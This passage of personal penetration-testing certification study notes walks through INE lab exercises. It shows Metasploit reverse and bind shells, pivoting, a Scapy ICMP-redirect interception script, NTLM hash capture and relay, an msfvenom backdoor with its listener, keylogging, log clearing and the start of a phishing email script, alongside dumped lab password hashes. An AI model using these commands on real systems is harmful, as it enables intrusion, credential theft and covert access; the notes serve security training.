set TARGET 3 //Regsvr32
set LHOST 172.16.5.101
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
</code></pre></div></div>

<ul>
  <li>copy the regsvr32 command and execute in the target machine</li>
</ul>

<blockquote>
  <p>[+] - this new INEs browser lab is the worst, where dafk is the openvpn access?
[+] - i want my money back lol</p>
</blockquote>

<blockquote>
  <p>anyway, we should get a shell</p>
</blockquote>

<ul>
  <li>discover new machines in the new network
ipconfig // to show the network
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run arp_scanner -r 10.100.40.0/24
</code></pre></div>    </div>
  </li>
  <li>add a new route within meterpreter</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	run autoroute -s 10.100.40.0/24
	background
</code></pre></div></div>

<ul>
  <li>scan</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	use auxiliary/scanner/portscan/tcp
	set options
	// port 80 is open
</code></pre></div></div>

<ul>
  <li>portfwd the port 80 to our port 1234</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	sessions -i 1
	portfwd add -l 1234 -p 80 -r 10.100.40.107
	portfwd list
</code></pre></div></div>

<ul>
  <li>scan the <strong>localhost</strong> in another terminal // actually is the port 80 of the target</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	nmap -sV -p 1234 localhost
</code></pre></div></div>

<ul>
  <li>
    <p>search for badblue exploit 
The 10.100.40.107 machine is not accessible from the Kali machine, so we cant use the reverse_tcp payload. This is an essential step \for us to choose the correct payload. In this case, we have to use the bind_tcp payload to gain the meterpreter session.</p>
  </li>
  <li>
    <p>run the exploit windows/http/badblue_passthru</p>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	set RHOSTS 10.100.40.107
	set PAYLOAD windows/meterpreter/bind_tcp
	exploit
	getuid
	sysinfo
</code></pre></div></div>

<blockquote>
  <p>we should get a shell</p>
</blockquote>

<h1 id="lab-icmp">Lab ICMP</h1>

<p>myip 10.100.13.20</p>

<ul>
  <li>
    <p>Your goals are:</p>

    <p>Find the web administration panel
  Identify the client machine
  Steal some valid credentials \for the web administration panel</p>
  </li>
  <li>
    <p>Identify the network you can reach:</p>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ ip route show dev tap0
	10.23.56.0/24 via 10.100.13.1 
	10.100.13.0/24 proto kernel scope link src 10.100.13.20 
</code></pre></div></div>

<p>Identify the live hosts:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	sudo nmap -sn -n 10.23.56.0/24 10.100.13.0/24
or  fping -a -g 10.100.13.0/24 2&gt;/dev/null

	
	10.100.13.1
	10.100.13.126
	10.23.56.1
	10.23.56.100

</code></pre></div></div>

<ul>
  <li>Identify the victim and the server:</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sS -sV -n 10.23.56.100 10.100.13.126
</code></pre></div></div>

<ul>
  <li>Configure your machine to perform IP Masquerading</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward 
iptables -t nat -A POSTROUTING -s 10.100.13.0/255.255.255.0 -o tap0 -j MASQUERADE
</code></pre></div></div>

<ul>
  <li>
    <p>Creating an ICMP Redirect Script</p>
  </li>
  <li>
    <p>Creating and sending ICMP redirect packets</p>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>originalRouterIP='10.100.13.1'
attackerIP='10.100.13.20'
victimIP='10.100.13.126'
serverIP='10.23.56.100'

</code></pre></div></div>

<ul>
  <li>We create an ICMP Redirect packet</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ip=IP()
ip.src=originalRouterIP
ip.dst=victimIP
icmpRedirect=ICMP()
icmpRedirect.type=5
icmpRedirect.code=1
icmpRedirect.gw=attackerIP
</code></pre></div></div>

<blockquote>
  <p>The ICMP packet payload /should/ contain the original TCP SYN packet</p>
</blockquote>

<ul>
  <li>sent from the victimIP</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>redirPayloadIP=IP()
redirPayloadIP.src=victimIP
redirPayloadIP.dst=serverIP
fakeOriginalTCPSYN=TCP()
fakeOriginalTCPSYN.flags="S"
fakeOriginalTCPSYN.dport=80
fakeOriginalTCPSYN.seq=444444444
fakeOriginalTCPSYN.sport=55555
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>while True:
    send(ip/icmpRedirect/redirPayloadIP/fakeOriginalTCPSYN)
# Press &lt;enter&gt;
</code></pre></div></div>

<blockquote>
  <p>The End</p>
</blockquote>

<h1 id="exploitation">Exploitation</h1>

<h2 id="vulnerability-assessment">Vulnerability Assessment</h2>

<p>This phase is aimed at building a list of the vulnerabilities present on target systems.
Can be done manually or automatically with tools such as nessus
Take note, if stealth is a necessity, vuln scanners are probably not the best idea.</p>

<ul>
  <li>Scanner perform their probes on:
Daemons listening on TCP and UDP ports
Configuration files of OS, software suites, network devices etc
Windows registry entries</li>
</ul>

<blockquote>
  <p>The purpose is to find vulnerabilities and misconfigurations</p>
</blockquote>

<ul>
  <li>
    <p>Some scanners:
OpenVAS = http://www.openvas.org/
Nexpose = http://www.rapid7.com/products/nexpose/index.jsp
GFI LAN Guard = http://www.gfi.com/products-and-solutions/network-security-solutions/gfi-languard
Nessus = http://www.tenable.com/products/nessus</p>
  </li>
  <li>
    <p>Nessus:
its composed of two components: a client and a server
Client to configure the scans, server to perform the scanning processes and report the results back to client
Client component offers a web inferface to interact and configure your scans
Server component performs the scans by sending probes to system and applications, collecting the responsed and matching them against its vulnerability database</p>
  </li>
</ul>

<blockquote>
  <p>The first step is determining if the target hosts are alive and which ports are open
For every open port found, the vuln scan will send special probes to determine which application is running on them.
For each detected service (aka daemon), the scanner queries its database looking For known vulnerabilities.</p>
</blockquote>

<h2 id="low-hanging-fruits--lhf-">Low Hanging Fruits ( LHF )</h2>

<p>Misconfigured servers
Unimplemented or badly implemented ACLs
Default or weak passwords
Open SMB shares / Null sessions
Broadcast Requests
Vulnerabilities related to public exploits</p>

<h3 id="weak-passwords">Weak Passwords</h3>

<h4 id="ncrack">Ncrack</h4>
<p>http://nmap.org/ncrack/</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ncrack 10.10.10.0/24 - Uses the entire network, from 10.10.10.0 to 10.10.10.255
ncrack add.els.com - Uses the IP address of the domain
ncrack 10.10.1,2.1-200 - Send probes to all ip address within the range 1-200 in the subnets 10.10.1 and 10.10.2
ncrack 10.10.10.56 - Send probes only to the 10.10.10.56 IP address
</code></pre></div></div>

<p>per-host specification:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;service://target:port&gt;
ncrack telnet://10.10.10.130:25
ncrack ssh://10.10.10.130 // if the service is in default port, we dont need to add here
ncrack ssh://10.10.10.130:120
ncrack ssh://10.10.10.130 telnet://10.10.10.60:218 // verifying 2 services
ncrack 10.10.10.10,15 -p ssh:50,telnet  // using -p = parameter

/usr/share/ncrack = list of common usernames and passwords
-U = username wordlist // -P = password wordlist
-u = fixed usernames // -p = fixed passwords // like hydra
-v = verbosity // -d[0-10] = debugging level
-f = exit once it finds valid credentials
--resume &lt;path&gt; = to continue a previosly saved sessions

</code></pre></div></div>

<blockquote>
  <p>can be used with nmap
scan with nmap first
export the result -o [ N/X/L ]
feed ncrack with Nmap results with the options -i [ N/X/L ]</p>
</blockquote>

<h4 id="medusa">Medusa</h4>
<p>https://github.com/jmk-foofus/medusa</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-h &lt;target hostname or ip&gt;
-H &lt;file&gt; = file containing target hostanames or IP addresses
-u &lt;target&gt; = fixed username
-U &lt;file&gt; = username wordlist
-p &lt;target&gt; = fixed password 
-P &lt;file&gt; = password wordlist
-d = to show availables modules (service that Medusa can target)
	/usr/lib/medusa/modules
-q = display the module usage information
-M = module

example: 
	medusa -M telnet -q
	medusa -h 192.168.102.149 -M telnet -U username.lst -P password.lst

</code></pre></div></div>

<h4 id="patator">Patator</h4>
<p>https://github.com/lanjelot/patator
manual = patator.py &gt; USAGE section</p>

<p>example:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>patator ssh_login host=10.0.0.1 user=root password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed.'

user=root &gt; fixed username to test
password=FILE0 &gt; its placeholder, FILE means we want to use a file, wordlist
0 its used to match the corresponding wordlist (0=passwords.txt) 
indicate what order to iterate over all the wordlists. 
We can have additional placeholders (FILE0, FILE1)
Patator uses the first entry in FILE0 and iterates through all the entries in FILE1
Then it takes the second entry in FILE0 and iterates through all the words contained in FILE1 etc
-x specify what to do upon receiving the expected result
</code></pre></div></div>

<h4 id="eyewitness">EyeWitness</h4>
<p>https://github.com/ChrisTruncer/EyeWitness</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python EyeWitness.py --headless --prepend-https -f &lt;urls file&gt;

when the scan is complete it will generate an HTML report
--active-scan = actively attempt to log into any and all devices found using known default credentials
however, can result in account lockouts and will likely generate IDS or HIDS alerts.
</code></pre></div></div>

<h4 id="rsmangler">Rsmangler</h4>
<p>https://digi.ninja/projects/rsmangler.php</p>

<ul>
  <li>can be used to help us generate targeted wordlists we can use For our dictionary attacks</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat words.txt | rsmangler --file - &gt; words_new.txt
</code></pre></div></div>

<blockquote>
  <p>words here would be key words relative to that company For example, the word_new it will be generated a sort of variations of theses words. 3 words can generate 7000 results.</p>
</blockquote>

<h4 id="cewl">CeWL</h4>
<p>https://digi.ninja/projects/cewl.php</p>

<p>It scrapes a target organizations website For keywords, and in turn, will generate a list of words we can use For our wordlist.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cewl -m 8 http://www.google
	// -m 8 = create a list of words with minimum of 8 characters
</code></pre></div></div>

<blockquote>
  <p>we could then, further improve our wordlist using Rsmangler to create permutations of the keywords identified with cewl.</p>
</blockquote>

<h4 id="mentalist">Mentalist</h4>
<p>https://github.com/sc0tfree/mentalist
https://github.com/sc0tfree/mentalist/wiki</p>

<blockquote>
  <p>its GUI 
can generate rules files that can be used with hashcat and john</p>
</blockquote>

<h2 id="exploitation-1">Exploitation</h2>

<h3 id="windows-authentication-weaknesses">Windows Authentication Weaknesses</h3>
<p><strong>LM/NTLMv1</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>challenge/response protocol
Type1 (negotiation), Type 2 (challenge) and Type 3 (Authentication) 1. The client sends a request For authentication 2. Server sends an 8-byte challenge (random value) 3. Client encrypts the challenge using the password hash and send it back as response
</code></pre></div></div>

<p>The generated hash (16-bytes long) is padded with 5 null bytes making it a 21 bytes string
The 21 bytes string is split in 3 blocks, 7bytes long each + 1 parity byte. The responde will be then 24 bytes long.</p>
<ul>
  <li>
    <p>In the attack scenario we impersonate the server, and then the challenge is chosen by us.
moreover: http://davenport.sourceforge.net/ntlm.html#theType3Message</p>
  </li>
  <li>
    <p>Weaknesses:
  No diffusion, meaning that each part of DES output is not linked to the previous one. This allow attacks on the three blocks individually. DES is an old algorithm with intrinsic weaknesses. The third DES key block is much weaker than the others, since it has 5 null bytes For padding.</p>
  </li>
  <li>
    <p>How exploit this weaknesses?
  Our goal is to capture the client responde (step 3 of the protocol)</p>
  </li>
  <li>
    <p>There is 2 methods:
  Force the client (target) to start a connection to us (fake server)
  Use MITM techniques in order to sniff the client response</p>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	metasploit
	use auxiliary/server/capture/smb
	set challenge = 1122334455667788
	set johnpwfile = hashpwd //tell metasploit to save the hashes to a file and formatted to work with john.
	run
</code></pre></div></div>

<blockquote>
  <p>Since we control the challenge (that acts as a salt in the hash), we can use rainbow tables.
There is tables built For the 8 byte server challenge (1122334455667788)</p>
</blockquote>

<ul>
  <li>Force the client to start a connection
  the easiest way is through SMB authentication
  we can embed a UNC path (Universal Naming Convention) (\SERVER_IP\SHARE) into an email message or a web page.</li>
</ul>

<p>HTML tag:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	&lt;img src="\\192.168.102.147\ADMIN$"&gt;
</code></pre></div></div>

<blockquote>
  <p>If someone open the page and attempts a connection to our listener we should get the hashes
everytime they click its the same hash, because the challenge is fixed (11222334455667788)
useful tip: if the password length is less or equal 7 characters, the last 8 bytes of NTLM response are always the same: <strong>2f85252cc731bb25</strong></p>
</blockquote>

<ul>
  <li>With hashes in hand
  Now we can crack the hashes
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john --format=netlm hashpwd
</code></pre></div>    </div>
  </li>
</ul>

<h4 id="rainbow-tables">Rainbow tables</h4>
<p>// to quicken the cracking process we can use rainbow tables
rcracki_mt: 
	https://github.com/foreni-packages/rcracki_mt
rainbow tables:
	http://project-rainbowcrack.com/table.htm
	http://ophcrack.sourceforge.net/tables.php</p>

<blockquote>
  <p>copy the first 8-bytes of the LMHASH (16 characters)</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rcracki_mt -h 1234567812345678 -t 4 *.rti
-h = specify the 8byte hash
-t = threads
*.rti = the path of the downloaded rainbow tables
</code></pre></div></div>

<blockquote>
  <p>we should have a half password
now we brute-force the remainder of the hash</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>metasploit-framework/tools/password &gt; halflm_second.rb
</code></pre></div></div>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ruby</span> <span class="n">halflm_second</span><span class="p">.</span><span class="nf">rb</span> <span class="o">-</span><span class="n">n</span> <span class="o">&lt;</span><span class="n">complete</span> <span class="nb">hash</span><span class="o">&gt;</span> <span class="o">-</span><span class="nb">p</span> <span class="o">&lt;</span><span class="n">half</span> <span class="n">discovered</span> <span class="n">password</span><span class="o">&gt;</span>
</code></pre></div></div>

<blockquote>
  <p>we have the full password
but its all uppercase, which may not be accurate
so we will use a perl script in the john folder : netntlm.pl</p>
</blockquote>

<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">perl</span> <span class="nv">netntlm</span><span class="o">.</span><span class="nv">pl</span> <span class="o">-</span><span class="nv">file</span> <span class="o">&lt;</span><span class="nv">hashpwd</span> <span class="nv">file</span><span class="o">&gt;</span> <span class="o">-</span><span class="nv">seed</span> <span class="o">&lt;</span><span class="nv">full</span> <span class="nv">password</span><span class="o">&gt;</span>
</code></pre></div></div>

<blockquote>
  <p>we can also use the netntlm.pl to find the uppercase password with the half portion (instead of halflm_second.rb)
and then use it again to find the case-sensitive one</p>
</blockquote>

<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">perl</span> <span class="nv">netntlm</span><span class="o">.</span><span class="nv">pl</span> <span class="o">-</span><span class="nv">file</span> <span class="o">&lt;</span><span class="nv">hashpwd</span> <span class="nv">file</span><span class="o">&gt;</span> <span class="o">-</span><span class="nv">seed</span> <span class="o">&lt;</span><span class="nv">half</span> <span class="nv">password</span><span class="o">&gt;</span>
</code></pre></div></div>

<h4 id="ntlmv2">NTLMv2</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>the difference with the old NTLMv1 is that the type 3 message is generated in a differente way. ``` HMAC-MD5(NTLM Hash, &lt;USERNAME, server&gt;)  HMAC-MD5(NTLMv2 Hash, &lt;BLOB, Server_challenge&gt;)  Server receives hash + blob blob contains a client challenge and the timestamp ```
</code></pre></div></div>

<ul>
  <li>
    <p>blob:
  blob signature (4 bytes)
  reserved (4 bytes)
  timestamp (8 bytes)
  client nonce (random 8 bytes)
  unknown (4 bytes)
  target information (variable length)
  unknown (4 bytes)</p>
  </li>
  <li>
    <p>NTLMv2 changes:
  dues to timestamp and the client response, the response changes every time
  impossible to create rainbow tables to gather the NT hash or the password from the NTLMv2 response
  dictionary does not make sense as the key is a hash
  the only possible attack is by brute-forcing the HMAC key
  the NTLMv2 hash is bound to a particular server and particular username so its not reusable</p>
  </li>
  <li>
    <p>moreover:
  http://davenport.sourceforge.net/ntlm.html#ntlmVersion2
  http://davenport.sourceforge.net/ntlm.html#theNtlmv2Response</p>
  </li>
</ul>

<h4 id="smb-relay-attacks">SMB Relay attacks</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>allows the attacker to re-use authentication attempts in order to gain access to a system in the network
</code></pre></div></div>

<ul>
  <li>SMB Relay on NTLMv1</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	msfconsole
	use exploit/windows/smb/smb_relay
	set options
	run
	
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// wait to someone connect to our machine
// this can happen with: backups, patch manegement, updates and so on
// we will be able to obtain a meterpreter session
// btw, this only works if the target machines has the **network security: LAN Manager authentication level** set to **Send Lm &amp; NTLM responses**.
</code></pre></div></div>

<h4 id="smb-relay-on-ntlmv2">SMB Relay on NTLMv2</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>metasploit smb_relay works well too, but lets use impacket
https://github.com/coresecurity/impacket
</code></pre></div></div>

<p>create the payload:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f exe -o smbexp.exe
</code></pre></div></div>

<p>create the handler:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exploit/multi/handler
set options accordingly with the payload
</code></pre></div></div>

<p>config smbrelayx:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbrelayx.py -h &lt;target ip&gt; -e &lt;msfvenom exe payload file path&gt;
</code></pre></div></div>

<blockquote>
  <p>we should gain a shell in meterpreter</p>
</blockquote>

<h4 id="eternalblue-ms17-010">EternalBlue (MS17-010)</h4>
<p>detecting a vuln host:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>auxiliary/scanner/smb/smb_ms17_010
</code></pre></div></div>

<p>exploit module:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exploit/windows/smb/ms17_010_eternalblue
</code></pre></div></div>

<h4 id="client-side-exploitation">Client-Side Exploitation</h4>
<ul>
  <li>requires user interaction</li>
</ul>

<p>exploits the mozilla pdf.js PDF file viewer</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	exploit/multi/browser/firefox_pdfjs_privilege_escalation
	set options
	// srvhost = our ip
	// payload= firefox/shell_reverse_tcp
</code></pre></div></div>

<blockquote>
  <p>now we need to lure the victim to click on the link generated by the metasploit
we should get a meterpreter shell</p>
</blockquote>

<p>another module:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exploit/multi/browser/adobe_flash_hacking_team_uaf
</code></pre></div></div>

<h4 id="remove-exploitation">Remove Exploitation</h4>
<ul>
  <li>does not require use interaction (open link, email etc)</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	exploit/windows/smb/ms08_067_netapi
	set options
</code></pre></div></div>

<blockquote>
  <p>if the machine is vulnerable and the exploit succeds, we should get a new shell</p>
</blockquote>

<p>NTLMv2</p>

<p><img src="/assets/images/posts/2023-11-19-ecppt/21.png" alt="Alt text" class="align-center" /></p>

<h3 id="metasploit">Metasploit</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfupdate 
service postgresql start
msfconsole
</code></pre></div></div>

<h4 id="search">search</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>type:exploit platform:windows
author:HDM
search cve:2015
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>execute -f cmd.exe -i H
</code></pre></div></div>
<p>//stealth</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>search -f secret.*
</code></pre></div></div>
<p>// in meterpreter shell</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run post/windows/gather
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps = show processes
migrate = need to specify the PID of the process
run post/windows/manage/migrate = migrate automatically to notepad.exe
</code></pre></div></div>

<h4 id="keystroke-capture">keystroke capture</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>keyscan_start
keyscan_dump
keyscan_stop
</code></pre></div></div>

<blockquote>
  <p>clearev = clear traces/logs etc</p>
</blockquote>

<h2 id="lab-va">Lab VA</h2>
<p>myip: 172.16.5.50
scope: 10.50.97.0/24</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fping -a -g 10.50.97.0/24 2&gt;/dev/null &gt; hostsup

10.50.97.1
10.50.97.5 - winxp - eternal blue
10.50.97.8 - server 2003 - eternal blue
10.50.97.14 - server 2003 - eternal blue
10.50.97.21

</code></pre></div></div>

<ul>
  <li>You can start Nessus Scanner by typing /bin/systemctl start nessusd.service</li>
  <li>Then go to https://kali:8834/ to configure your scanner</li>
</ul>

<p>search ms08-067-netapi</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
Administrator:500:6df60586675b97c51f6252914a7633d7:fc5399dc481550f5442d1585e10c0345:::
elsuser:1005:aad3b435b51404eeaad3b435b51404ee:04820cccb2ea44ad7e60f97961fba7e1:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:a88f7de3e682d17fea34bd03086620b5:2b07e52daf608f50d4cd9506c5b0220d:::
netadmin:1004:a4fd0910b9418e67d342ec751ef6b28d:6757a9560a881a505b9fa7bfadd88874:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:9f79c84005db73e0122f424022f8dbc0:::

</code></pre></div></div>

<p>netadmin:CONGRAT0905</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username    Domain     LM                            NTLM                          SHA1
--------    ------     --                            ----                          ----
ELS-WINXP$  WORKGROUP  aad3b435b51404eeaad3b435b514  31d6cfe0d16ae931b73c59d7e0c0  da39a3ee5e6b4b0d3255bfef95601
                       04ee                          89c0                          890afd80709

</code></pre></div></div>

<p>http://www.darkoperator.com/blog/2011/12/16/psexec-scanner-auxiliary-module.html
	// tried to use, without success
	//seems old 2011, anyway I did one by one instead</p>

<p>resume:
	one machine was winxp, so we got access with ms08-067-netapi 
	then we grabbed the hashes and use psexec to enter in other 2 machines
	the last one was a ftp server, we searched the version in metasploit and got access too.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ms08-067-netapi 
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//used For 10.50.97.5
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exploit(windows/smb/ms17_010_psexec

</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//used For 10.50.97.8,14
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exploit(freebsd/ftp/proftp_telnet_iac) &gt; run
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//used For 10.50.97.21
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.2a
</code></pre></div></div>

<h2 id="lab-nessus">Lab Nessus</h2>
<p>myip: 192.168.78.100
network: 192.168.78.01/24
dmz: 10.100.0.0/24</p>

<p>10.100.0.1
10.100.0.80
192.168.78.1
192.168.78.10
192.168.78.20
192.168.78.18</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sn -oG - 192.168.78.* | awk '/Up$/ {print $2}'
</code></pre></div></div>

<p>192.168.78.10 = xp
	ms08_067_netapi</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
	got the hashes:
	Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
	eLSAdmin:1003:67fb9805a02c8249aad3b435b51404ee:b0c6522c478a0886fb92544d16c75679:::
	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	HelpAssistant:1000:a88f7de3e682d17fea34bd03086620b5:2b07e52daf608f50d4cd9506c5b0220d:::
	netadmin:1004:6d4c8d28110c649d1f6252914a7633d7:1f1c7bfdba645b14c37dde4465b59542:::
	SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:9f79c84005db73e0122f424022f8dbc0:::

</code></pre></div></div>

<p>192.168.78.18
	ms17-010-psexec
	meterpreter shell</p>

<p>//First scan nessus in GUI
//Then we can import and analyses via metasploit</p>

<h1 id="service-postgresql-start">service postgresql start</h1>
<h1 id="msfdb-init">msfdb init</h1>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>load nessus
nessus_connect user:password@localhost
nessus_scan_list
nessus_report_vulns &lt;id&gt;
nessus_report_hosts &lt;id&gt;
nessus_db_import &lt;id&gt;

</code></pre></div></div>

<p>https://github.com/darkoperator/Metasploit-Plugins/blob/master/pentest.rb
load pentest
vuln_exploit</p>

<blockquote>
  <p>we can then create a nessus scan with credentials to get better results:
Moreover, set the following SSH credentials:</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Username: netadmin
    Password: netpwd
</code></pre></div></div>

<h2 id="lab-client-side">Lab Client Side</h2>

<p>myip: 192.168.70.45/24</p>

<p>scope: 
	10.10.50.0/23
	10.10.51.0</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
    user@foocompany.com
    adam@foocompany.com
    mary@foocompany.com
</code></pre></div></div>

<p>We should send an email to user, and exploit via multi/browser/java_jre17_exec.
because we do not have direct access to the 10.10 network.</p>

<p>Tried to do with thunderbird, no success.
I will try with Icedove later.</p>

<p>Then we should 
meterpreter session:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	run autoroute -s 10.10.51.0/24
	background
auxiliary/server/socks4a

</code></pre></div></div>

<ul>
  <li>set options
  remember, it is the same port as the file: /etc/proxychains.conf</li>
</ul>

<blockquote>
  <p>now we can nmap to target, because proxychains is redirecting through the first shell machine to the meterpreter session.</p>
</blockquote>

<p>search ProFTPD 1.3.2a</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	exploit/freebsd/ftp/proftp_telnet_iac
	we should have access to the server
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ip addr
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.4 LPORT=4444 -f exe &gt; backdoor.exe
file backdoor.exe
</code></pre></div></div>

<p>msfconsole -q</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.15.4
set LPORT 4444
exploit
</code></pre></div></div>

<ul>
  <li>python &gt; send_email.py</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="kn">import</span> <span class="n">smtplib</span>
<span class="kn">from</span> <span class="n">email.mime.multipart</span> <span class="kn">import</span> <span class="n">MIMEMultipart</span>
<span class="kn">from</span> <span class="n">email.mime.text</span> <span class="kn">import</span> <span class="n">MIMEText</span>
<span class="kn">from</span> <span class="n">email.mime.base</span> <span class="kn">import</span> <span class="n">MIMEBase</span>
<span class="kn">from</span> <span class="n">email</span> <span class="kn">import</span> <span class="n">encoders</span>
<span class="n">fromaddr</span> <span class="o">=</span> <span class="sh">"</span><span class="s">attacker@fake.net</span><span class="sh">"</span>
<span class="n">toaddr</span> <span class="o">=</span> <span class="sh">"</span><span class="s">bob@ine.local</span><span class="sh">"</span>  
<span class="c1"># instance of MIMEMultipart
</span><span class="n">msg</span> <span class="o">=</span> <span class="nc">MIMEMultipart</span><span class="p">()</span>
<span class="c1"># storing the senders email address  
</span><span class="n">msg</span><span class="p">[</span><span class="sh">'</span><span class="s">From</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">fromaddr</span>
<span class="c1"># storing the receivers email address 
</span><span class="n">msg</span><span class="p">[</span><span class="sh">'</span><span class="s">To</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">toaddr</span>
<span class="c1"># storing the subject 
</span><span class="n">msg</span><span class="p">[</span><span class="sh">'</span><span class="s">Subject</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Subject of the Mail</span><span class="sh">"</span>
<span class="c1"># string to store the body of the mail
